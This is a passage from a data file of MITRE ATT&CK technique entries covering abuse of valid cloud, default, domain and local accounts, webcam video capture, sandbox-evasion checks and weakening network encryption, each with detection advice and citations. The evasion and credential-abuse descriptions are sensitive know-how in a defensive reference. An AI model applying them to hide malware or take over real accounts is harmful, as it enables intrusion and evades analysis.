2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Trend Micro Pawn Storm April 2017),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Microsoft NICKEL December 2021),(Citation: CyberBit Dtrack),(Citation: FoxIT Wocao December 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Symantec Cicada November 2020),(Citation: Novetta-Axiom),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FireEye APT39 Jan 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Aqua Kinsing April 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: Kaspersky Carbanak),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: RSA2017 Detect and Respond Adair),(Citation: DOJ GRU Indictment Jul 2018),(Citation: US-CERT TA18-074A),(Citation: FireEye APT33 Guardrail),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: ESET Industroyer),(Citation: Dell TG-3390),(Citation: FireEye TRITON 2019),(Citation: Microsoft STRONTIUM Aug 2019),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: FireEye Respond Webinar July 2017),(Citation: Symantec W32.Duqu),(Citation: Visa FIN6 Feb 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: Unit42 OilRig Playbook 2023),(Citation: Accenture MUDCARP March 2019),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: McAfee Night Dragon),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: US-CERT Ukraine Feb 2016),(Citation: FireEye FIN10 June 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: DOJ Iran Indictments March 2018),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Symantec Seaduke 2015),(Citation: Anomali Linux Rabbit 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Cycraft Chimera April 2020),(Citation: Symantec Suckfly May 2016),(Citation: PWC Cloud Hopper April 2017),(Citation: TechNet Least Privilege),(Citation: Microsoft Common Conditional Access Policies),(Citation: Microsoft Securing Privileged Access),(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet),(Citation: TechNet Credential Theft)"}
{"ID":"T1078.004","name":"Valid Accounts: Cloud Accounts","description":"Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management systems, such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.\n\nOnce a cloud account is compromised, an adversary may perform [Account Manipulation](https://attack.mitre.org/techniques/T1098) - for example, by adding [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) - to maintain persistence and potentially escalate their privileges.","url":"https://attack.mitre.org/techniques/T1078/004","created":"13 March 2020","last modified":"21 March 2023","version":"1.5","tactics":"Defense Evasion, Initial Access, Persistence, Privilege Escalation","detection":"Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1078","defenses bypassed":null,"contributors":"Jon Sternstein, Stern Security","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Roadtools),(Citation: Microsoft Holmium June 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Microsoft NICKEL December 2021),(Citation: Peirates GitHub),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: TechNet Least Privilege),(Citation: Microsoft Common Conditional Access Policies),(Citation: AWS - IAM Console Best Practices),(Citation: Microsoft Security Alerts for Azure AD Roles),(Citation: Microsoft Azure security baseline for Azure Active Directory),(Citation: TechNet Credential Theft)"}
{"ID":"T1078.001","name":"Valid Accounts: Default Accounts","description":"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)","url":"https://attack.mitre.org/techniques/T1078/001","created":"13 March 2020","last modified":"30 March 2023","version":"1.2","tactics":"Defense Evasion, Initial Access, Persistence, Privilege Escalation","detection":"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Logon Session: Logon Session Creation, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1078","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: DFIR Phosphorus November 2021),(Citation: Accenture HyperStack October 2020),(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)"}
{"ID":"T1078.002","name":"Valid Accounts: Domain Accounts","description":"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.","url":"https://attack.mitre.org/techniques/T1078/002","created":"13 March 2020","last modified":"13 April 2023","version":"1.3","tactics":"Defense Evasion, Initial Access, Persistence, Privilege Escalation","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nOn Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd).(Citation: Ubuntu SSSD Docs) \n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","platforms":"Linux, Windows, macOS","data sources":"Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1078","defenses bypassed":null,"contributors":"Jon Sternstein, Stern Security","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Symantec Buckeye),(Citation: IBM TA505 April 2020),(Citation: FoxIT Wocao December 2019),(Citation: FireEye Shamoon Nov 2016),(Citation: Unit 42 Shamoon3 2018),(Citation: Microsoft POLONIUM June 2022),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Dell TG-1314),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CobaltStrike Daddy May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Night Dragon),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: DFIR Phosphorus November 2021),(Citation: cobaltstrike manual),(Citation: ESET Dukes October 2019),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Crowdstrike Indrik November 2018),"}
{"ID":"T1078.003","name":"Valid Accounts: Local Accounts","description":"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ","url":"https://attack.mitre.org/techniques/T1078/003","created":"13 March 2020","last modified":"13 April 2023","version":"1.3","tactics":"Defense Evasion, Initial Access, Persistence, Privilege Escalation","detection":"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","platforms":"Containers, Linux, Windows, macOS","data sources":"Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1078","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Emotet Dec 2017),(Citation: Bitdefender StrongPity June 2020),(Citation: ESET Crutch December 2020),(Citation: cobaltstrike manual),(Citation: US-CERT NotPetya 2017),(Citation: FireEye FIN10 June 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FireEye APT32 May 2017),(Citation: Umbreon Trend Micro),(Citation: FireEye Exchange Zero Days March 2021),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: CobaltStrike Daddy May 2017),(Citation: Talos Nyetya June 2017),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Remote Use of Local),(Citation: TechNet Least Privilege),(Citation: TechNet Credential Theft)"}
{"ID":"T1125","name":"Video Capture","description":"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)","url":"https://attack.mitre.org/techniques/T1125","created":"31 May 2017","last modified":"30 March 2023","version":"1.1","tactics":"Collection","detection":"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: 360 Machete Sep 2020),(Citation: Volexity Patchwork June 2018),(Citation: EFF Manul Aug 2016),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Talent-Jump Clambling February 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Fortinet Remcos Feb 2017),(Citation: Proofpoint TA505 October 2019),(Citation: IBM TA505 April 2020),(Citation: ESET InvisiMole June 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Palo Alto T9000 Feb 2016),(Citation: Imminent Unit42 Dec2019),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist Machete Aug 2014),(Citation: Talos Agent Tesla Oct 2018),(Citation: Fidelis njRAT June 2013),(Citation: jRAT Symantec Aug 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Citizen Lab Group5),(Citation: Github PowerShell Empire),(Citation: DOJ FIN7 Aug 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Talos ZxShell Oct 2014),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: SecureList Silence Nov 2017),(Citation: GitHub QuasarRAT),(Citation: Zscaler Cobian Aug 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Anomali Static Kitten February 2021),(Citation: Talos PoetRAT April 2020),(Citation: FireEye Periscope March 2018),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Malwarebytes DarkComet March 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Cylance Machete Mar 2017),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Talos Oblique RAT March 2021),(Citation: GitHub Pupy),"}
{"ID":"T1497","name":"Virtualization/Sandbox Evasion","description":"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\n\n","url":"https://attack.mitre.org/techniques/T1497","created":"17 April 2019","last modified":"18 October 2021","version":"1.3","tactics":"Defense Evasion, Discovery","detection":"Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis","contributors":"Deloitte Threat Library Team; Sunny Neo","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: NHS Digital Egregor Nov 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: Check Point Black Basta October 2022),(Citation: Unit 42 Gamaredon February 2022),(Citation: Cyble Egregor Oct 2020),(Citation: F-Secure CozyDuke),(Citation: ESET Carberp March 2012),(Citation: Unit42 Redaman January 2019),(Citation: Cybereason Bazar July 2020),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: ESET Operation Spalax Jan 2021),(Citation: FireEye Hancitor),(Citation: Kaspersky Lyceum October 2021),(Citation: Kaspersky StoneDrill 2017),(Citation: ESET Gelsemium June 2021),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: FireEye APT28),(Citation: Proofpoint Bumblebee April 2022),(Citation: Talos Bisonal Mar 2020),(Citation: Netskope Squirrelwaffle Oct 2021),"}
{"ID":"T1497.001","name":"Virtualization/Sandbox Evasion: System Checks","description":"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)","url":"https://attack.mitre.org/techniques/T1497/001","created":"06 March 2020","last modified":"18 October 2021","version":"2.1","tactics":"Defense Evasion, Discovery","detection":"Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1497","defenses bypassed":"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis","contributors":"Deloitte Threat Library Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cyphort EvilBunny Dec 2014),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks Karagany July 2019),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Securelist APT10 March 2021),(Citation: Check Point Black Basta October 2022),(Citation: Talos GravityRAT),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Microsoft DUBNIUM June 2016),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Check Point APT34 April 2021),(Citation: NCCGroup RokRat Nov 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: ATT QakBot April 2021),(Citation: ESET Grandoreiro April 2020),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: Unit 42 WhisperGate January 2022),(Citation: ESET Okrum July 2019),(Citation: Talos Remcos Aug 2018),(Citation: HP SVCReady Jun 2022),(Citation: ESET OceanLotus macOS April 2019),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Unit 42 Lucifer June 2020),(Citation: Talos Smoke Loader July 2018),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Talos Frankenstein June 2019),(Citation: Talos Group123),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: ESET Attor Oct 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: Unit42 PlugX June 2017),(Citation: IBM MegaCortex),(Citation: ASERT Donot March 2018),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Microsoft FinFisher March 2018),(Citation: Unit 42 BadPatch Oct 2017),(Citation: ESET EvilNum July 2020),(Citation: Talos PoetRAT April 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Talos Oblique RAT March 2021),(Citation: Symantec Dyre June 2015),(Citation: GitHub Pupy),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1497.003","name":"Virtualization/Sandbox Evasion: Time Based Evasion","description":"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)","url":"https://attack.mitre.org/techniques/T1497/003","created":"06 March 2020","last modified":"15 October 2021","version":"1.2","tactics":"Defense Evasion, Discovery","detection":"Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1497","defenses bypassed":"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis","contributors":"Deloitte Threat Library Team; Jeff Felling, Red Canary; Jorge Orchilles, SCYTHE; Ruben Dodge, @shotgunner101","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Clop April 2021),(Citation: Cyphort EvilBunny Dec 2014),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Securelist APT10 March 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: JoeSecurity Egregor 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MDSec Brute Ratel August 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Kaspersky QakBot September 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: Unit42 BendyBear Feb 2021),(Citation: Malwarebytes Pony April 2016),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: ESET Okrum July 2019),(Citation: HP SVCReady Jun 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: Symantec RAINDROP January 2021),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Talos Lokibot Jan 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: wardle evilquest parti),(Citation: Joe Sec Trickbot),(Citation: Accenture MUDCARP March 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: Cyberint Qakbot May 2021),(Citation: ESET Dukes October 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Proofpoint Bumblebee April 2022),(Citation: Talos Bisonal Mar 2020),(Citation: Group IB GrimAgent July 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Crowdstrike DriveSlayer February 2022),"}
{"ID":"T1497.002","name":"Virtualization/Sandbox Evasion: User Activity Based Checks","description":"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) ","url":"https://attack.mitre.org/techniques/T1497/002","created":"06 March 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion, Discovery","detection":"User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1497","defenses bypassed":"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis","contributors":"Deloitte Threat Library Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: ESET Okrum July 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: FireEye FIN7 April 2017),"}
{"ID":"T1600","name":"Weaken Encryption","description":"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)","url":"https://attack.mitre.org/techniques/T1600","created":"19 October 2020","last modified":"21 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"There is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601). Some detection methods require vendor support to aid in investigation.","platforms":"Network","data sources":"File: File Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Encryption","contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
